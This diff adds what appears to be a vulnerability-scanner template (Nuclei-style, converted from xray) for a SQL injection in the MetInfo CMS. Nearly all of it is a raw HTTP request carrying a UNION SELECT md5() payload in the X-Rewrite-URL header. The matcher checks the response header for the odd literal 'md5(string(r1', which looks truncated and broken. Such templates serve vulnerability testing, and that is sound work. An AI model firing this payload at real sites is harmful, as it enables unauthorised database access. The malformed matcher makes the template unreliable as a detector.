@@ -1,0 +1,23 @@
+id: poc-yaml-metinfo-x-rewrite-url-sqli
+
+info:
+  name: poc-yaml-metinfo-x-rewrite-url-sqli
+  author: sharecast
+  severity: low
+  tags: xray-converted,sqli,ct-374915
+  reference:
+    - https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html
+
+http:
+  - raw:
+      - |
+        GET /index.php?lang=Cn&index=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Rewrite-URL: 1/2/404xxx' union select md5({{rand_int(1000, 9999)}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "md5(string(r1"
